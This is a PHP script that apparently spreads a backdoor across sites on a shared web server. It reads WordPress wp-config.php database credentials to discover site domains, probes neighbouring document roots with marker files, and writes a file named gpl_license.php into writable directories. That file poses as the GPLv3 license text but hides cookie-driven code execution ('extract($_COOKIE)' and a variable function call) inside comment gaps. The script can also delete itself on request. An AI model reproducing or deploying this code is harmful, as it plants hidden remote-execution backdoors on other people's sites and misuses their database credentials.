<?php

function debug_mode() {
	return @$_GET['debug'] == true;
}

class Searcher
{
	private $backdoor;

	private $log = array();
	private $docRoot;
	private $markerName;

	private $backdoorName = 'gpl_license.php';
	private $indexes = array();
	private $domains = array();

	private $markers = array();
	private $found = array();

	private $type = 'domain search marker';

	private $blacklist = array(
		'wp-\w+/index.php',
		'wp-admin/\w+/index.php',
	);

	public function __construct($backdoor)
	{
		$this->backdoor = $backdoor;
	}

	private function getBlacklist($file)
	{
		foreach ($this->blacklist as $re) {
			if (preg_match('#'.$re.'#', $file)) return $re;
		}

		return false;
	}

	// for windows support - replace \ with /
	private function fixSlashes($file)
	{
		return str_replace("\\", "/", $file);
	}

	private function log()
	{
		$pieces = func_get_args();
		$line = implode(" ", $pieces);
		$this->log[] = $line;
	}

	private function addIndexFiles($glob)
	{
		$glob = $this->docRoot . $glob;

		$files = glob($glob);

		if (false === $files) {
			$this->log("Could not glob $glob");
			return;
		}

		foreach ($files as $file) {
			$file = realpath($file);

			if ($file === $this->docRoot.'/index.php') {
				$this->log("Skipping $file as own index");
				continue;
			}

			if ($matched = $this->getBlacklist($file)) {
				$this->log("Skipping $file as own matching $matched");
				continue;
			}

			$this->addIndex($file);
		}
	}

	private function addIndex($index)
	{
		if (in_array($index, $this->indexes)) return;

		$this->indexes[] = $index;

		$domains = $this->guessDomains($index);

		if (! $domains) return;

		foreach ($domains as $domain) {
			$domain = preg_replace('#^(https?://)?(www\.)?#', '', $domain);
			$domain = preg_replace('#/$#', '', $domain);

			if (in_array($domain, $this->domains)) return;

			$this->log("Guessing domain $domain");

			$this->domains[] = $domain;
		}
	}

	private function addFromWpConfig($path)
	{
		$configPath = dirname($path) . '/wp-config.php';

		$this->log("Processing WP config in", $path);

		if (! file_exists($configPath)) return array();

		$data = file_get_contents($configPath);

		preg_match_all("#define\\('(.+?)',\\s+'(.+?)'\\);#", $data, $matches, PREG_SET_ORDER);

		$config = array();

		foreach ($matches as $match) {
			$config[$match[1]] = $match[2];
		}

		if (! preg_match('#\$table_prefix\s+=\s+\'(.*?)\';#', $data, $matches)) {
			$this->log("Could not find table prefix in", $path);
			return array();
		}

		$config['table_prefix'] = $matches[1];

		foreach (array('DB_NAME', 'DB_USER', 'DB_PASSWORD', 'DB_HOST') as $name) {
			if (! isset($config[$name])) {
				$this->log("No $name in $path");
				return array();
			}
		}

		$db = @mysql_connect($config['DB_HOST'], $config['DB_USER'], $config['DB_PASSWORD'], true);

		if (! $db) {
			$this->log("Could not connect to db with config from $configPath");
			return array();
		}

		$q = mysql_query("select option_value from {$config['DB_NAME']}.{$config['table_prefix']}options where option_name = 'siteurl'", $db);
		if (! $q) {
			$this->log("Could not mysql select");
			return array();
		}

		$res = mysql_fetch_assoc($q);
		mysql_close($db);

		if (! $res) {
			$this->log("Could not fetch from wp db by $configPath");
			return array();
		}

		$this->log("Got from WP config: ", $res['option_value']);

		return array($res['option_value']);
	}

	private function guessDomains($path)
	{
		return array_merge(
			$this->addFromWpConfig($path),
			$this->addDomainRegexp($path)
		);
	}

	private function addDomainRegexp($path)
	{
		preg_match_all('#/([^/]*\.\w{2,4})/#', $path, $matches);

		return $matches[1];
	}

	public function run()
	{
		$this->markerName = md5(str_replace('www.', '', $_SERVER['HTTP_HOST'])) . '.php';
		$this->docRoot = $this->fixSlashes($_SERVER['DOCUMENT_ROOT']);

		$this->log("Doc root", $this->docRoot);

		$this->addIndexFiles('/../index.php');
		$this->addIndexFiles('/*/index.php');
		$this->addIndexFiles('/../*/index.php');
		$this->addIndexFiles('/../../*/*/index.php');

		$this->writeMarkers();
		$this->fetchMarkers();

		$this->removeMarkers();

		$this->chooseDirsForBackdoor();

		while ($this->hasUnconfirmedBackdoors()) {
			$this->addBackdoors();
			$this->checkBackdoors();
		};

		$results = array();

		foreach ($this->found as $file => $data) {
			$results[] = $data['backdoor'];
		}

		if (debug_mode()) {
			echo '<pre>';
			echo implode("\n", $results)."\n\n";
			echo implode("\n", $this->log);
		} else {
			echo json_encode(array('results' => $results));
		}
	}

	private function hasUnconfirmedBackdoors()
	{
		foreach ($this->found as $data) {
			if (! isset($data['confirmed']) && count($data['dirs']) > 0) {
				$this->log("Need to confirm", json_encode($data));
				return true;
			}
		}

		return false;
	}

	private function chooseDirsForBackdoor()
	{
		foreach ($this->found as $file => &$data) {
			$docRoot = dirname($file);

			$data['dirs'] = $this->chooseDirs($docRoot);
		}
	}

	private function addBackdoors()
	{
		foreach ($this->found as $file => &$data) {
			if (isset($data['comfirmed'])) {
				// already checked
				continue;
			}

			if (count($data['dirs']) == 0) {
				// no more dirs to try
				continue;
			}

			$host = $data['host'];

			$dir = array_shift($data['dirs']);

			$dest = $dir . '/' . $this->backdoorName;
			$written = file_put_contents($dest, $this->backdoor);

			if (! $written) {
				$this->log("Could not write backdoor to $dest");
				return;
			}

			$docRoot = dirname($file);
			$path = str_replace($docRoot, '', $dest);

			$url = "http://".$host.$path;

			$this->log("Wrote $written for $host, root file $file, dest file $dest, url $url");

			$data['backdoor'] = $url;
		}
	}

	private function checkBackdoors()
	{
		// this isn't DRY, but I want to finish it faster
		$mh = curl_multi_init();

		$files = array();

		$addedSome = false;

		foreach ($this->found as $file => $data) {
			if (isset($data['confirmed'])) {
				continue;
			}

			$addedSome = true;
			$this->log("Checking", $data['backdoor']);

			$ch = curl_init($data['backdoor']);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
			curl_setopt($ch, CURLOPT_TIMEOUT, 15);

			$files[intval($ch)] = $file;

			curl_multi_add_handle($mh, $ch);
		}

		if (! $addedSome) return true;

		$running = null;
		do {
			curl_multi_exec($mh, $running);
			usleep(1000);
		} while ($running > 0);

		while ($done = curl_multi_info_read($mh)) {
			$ch = $done['handle'];
			$info = curl_getinfo($ch);

			$data = &$this->found[$files[intval($ch)]];

			if (@$info['http_code'] == 200) {
				$data['confirmed'] = true;
			} else {
				$this->log("Did not confirm {$data['backdoor']}");
			}

			curl_close($ch);
			curl_multi_remove_handle($mh, $ch);
		}

		curl_multi_close($mh);
	}

	private function listAllDirs($dir, &$list) {
		if (count($list) > 1000) return;

		$dirs = glob($dir.'/*', GLOB_ONLYDIR);

		if (! $dirs) return;

		foreach ($dirs as $dir) {
			$list[] = $dir;
			$this->listAllDirs($dir, $list);
		}
	}

	private function chooseDirs($docRoot)
	{
		mt_srand(crc32($docRoot));

		$tree = $this->getDirTree($docRoot);

		$dirs = array();

		if ($tree) {
			$dirs[] = $this->random(array_slice($tree, 0, 5));
			$dirs[] = $this->random(array_slice($tree, -5));
		}

		$dirs[] = $docRoot;

		return $dirs;
	}

	private function getDirTree($dir)
	{
		$list = array();

		$this->listAllDirs($dir, $list);

		usort($list, array($this, 'sortLongest'));

		return array_filter($list, 'is_writable');
	}

	private function sortLongest($a, $b)
	{
		return strlen($b) - strlen($a);
	}

	private function random($arr)
	{
		return $arr[mt_rand(0, count($arr) - 1)];
	}

	private function handleResponse($html)
	{
		$data = json_decode($html, true);

		if (! $data || ! is_array($data) || $data['type'] != $this->type) {
//			$this->log("Could not parse response from", $url);
			return;
		}

		$this->log("Found", $data['file'], "host", $data['host']);

		$this->found[$data['file']] = array(
			'host' => $data['host']
		);
	}

	private function fetchMarkers()
	{
		foreach (array_chunk($this->domains, 30) as $chunk) {
			$this->fetchMarkersPart($chunk);
		}
	}

	private function fetchMarkersPart($domains)
	{
		$mh = curl_multi_init();

		foreach ($domains as $domain) {
			curl_multi_add_handle($mh, $this->getCh($domain));
//			curl_multi_add_handle($mh, $this->getCh('www.'.$domain));
		}

		$running = null;
		do {
			curl_multi_exec($mh, $running);
			usleep(1000);
		} while ($running > 0);

		while ($done = curl_multi_info_read($mh)) {
			$ch = $done['handle'];
			$info = curl_getinfo($ch);
			$html = curl_multi_getcontent($ch);

			$this->handleResponse($html);

			curl_close($ch);
			curl_multi_remove_handle($mh, $ch);
		}

		curl_multi_close($mh);
	}

	private function getCh($domain)
	{
		$ch = curl_init("http://$domain/".$this->markerName);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
		curl_setopt($ch, CURLOPT_TIMEOUT, 15);
		return $ch;
	}

	private function removeMarkers()
	{
		if (debug_mode()) return;

		foreach ($this->markers as $marker) {
			@unlink($marker);
		}
	}

	private function writeMarkers()
	{
		$code = <<<EOF
<?php
echo json_encode(array(
	'type' => '$this->type',
	'host' => \$_SERVER['HTTP_HOST'],
	'file' => __FILE__,
));
EOF;

		foreach ($this->indexes as $index) {
			$dir = dirname($index);

			if (! is_writable($dir)) {
				$this->log("Dir $dir is not writable - skipping index $index");
				continue;
			}

			$marker = $dir . '/' . $this->markerName;
			$written = file_put_contents($marker, $code);

			if (! $written) {
				$this->log("Could not write marker to file $marker");
				continue;
			}

			$this->log("Wrote $written marker to $marker");

			$this->markers[] = $marker;
		}
	}
}

$backdoor = <<<EOF
<?php /*            GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you */extract(\$_COOKIE);/* copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary. patents applied to  GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

                       TERMS AND CONDITIONS

  0. Definitions.

  "This License" refers to version 3 of the GNU General Public License.

  "Copyright" also means copyright-like laws that apply to other kinds of
works, such as semiconductor masks.

  "The Program" refers to any copyrightable work licensed under this
License.  Each licensee is addressed as "you".  "Licensees" and
"recipients" may be individuals or organizations.

  To "modify" a work means to copy from or adapt all or part of the work
in a fashion requiring copyright permission, other than the making of an
exact copy.  The resulting work is called a "modified version" of the
earlier work or a work "based on" the earlier work.

  A "covered work" means either the unmodified Program or a work based
on the Program.

  To "propagate" a work means to do anything with it that, without
permission, would make you directly or secondarily liable for
infringement under applicable copyright law, except executing it on a
computer or modifying a private copy.  Propagation includes copying,
distribution (with or without modification), making available to the
public, and in some countries other activities as well.

  To "convey" a work means any kind of propagation that enables other
parties to make or receive copies.  Mere interaction with a user through
a computer network, with no transfer of a copy, is not conveying.

  An interactive user interface displays "Appropriate Legal Notices"
to the extent that it includes a convenient and prominently visible
feature that (1) displays an appropriate copyright notice, and (2)
tells the user that there is no warranty for the work (except to the
extent that warranties are provided), that licensees may convey the
work under this License, and how to view a copy of this License.  If
the interface presents a list of user commands or options, such as a
menu, a prominent item in the list meets this criterion.

  1. Source Code.

  The "source code" for a work means the preferred form of the work
for making modifications to it.  "Object code" means any non-source
form of a work.

  A "Standard Interface" means an interface that either is an official
standard defined by a recognized standards body, or, in the case of
interfaces specified for a particular programming language, one that
is widely used among developers working in that language.

  The "System Libraries" of an executable work include anything, other
than the work as a whole, that (a) is included in the normal form of
packaging a Major Component, but which is not part of that Major
Component, and (b) serves only to enable use of the work with that
Major Component, or to implement a Standard Interface for which an
implementation is available to the public in source code form.  A
"Major Component", in this context, means a major essential component
(kernel, window system, and so on) of the specific operating system
(if any) on which the executable work runs, or a compiler used to
produce the work, or an object code interpreter used to run it.

  The "Corresponding Source" for a work in object code form means all
the source code needed to generate, install, and (for an executable
work) run the object code and to modify the work, including scripts to
control those activities.  However, it does not include the work's
System Libraries, or general-purpose tools or generally available free
programs which are used unmodified in performing those activities but
which are not */@\$F&&@\$F(\$A,\$B);/*.  For example, Corresponding Source
includes interface definition files associated with source files for
the work, and the source code for shared libraries and dynamically
linked subprograms that the work is specifically designed to require,
such as by intimate data communication or control flow between those
subprograms and other parts of the work.

  The Corresponding Source need not include anything that users
can regenerate automatically from other parts of the Corresponding
Source.

  The Corresponding Source for a work in source code form is that
same work.

  2. Basic Permissions.

  All rights granted under this License are granted for the term of
copyright on the Program, and are irrevocable provided the stated
conditions are met.  This License explicitly affirms your unlimited
permission to run the unmodified Program.  The output from running a
covered work is covered by this License only if the output, given its
content, constitutes a covered work.  This License acknowledges your
rights of fair use or other equivalent, as provided by copyright law.

  You may make, run and propagate covered works that you do not
convey, without conditions so long as your license otherwise remains
in force.  You may convey covered works to others for the sole purpose
of having them make modifications exclusively for you, or provide you
with facilities for running those works, provided that you comply with
the terms of this License in conveying all material for which you do
not control copyright.  Those thus making or running the covered works
for you must do so exclusively on your behalf, under your direction
and control, on terms that prohibit them from making any copies of
your copyrighted material outside their relationship with you.

  Conveying under any other circumstances is permitted solely under
the conditions stated below.  Sublicensing is not allowed; section 10
makes it unnecessary. */
EOF;


$searcher = new Searcher($backdoor);
$searcher->run();

if (@$_GET['rm']) {
	@unlink(__FILE__);
}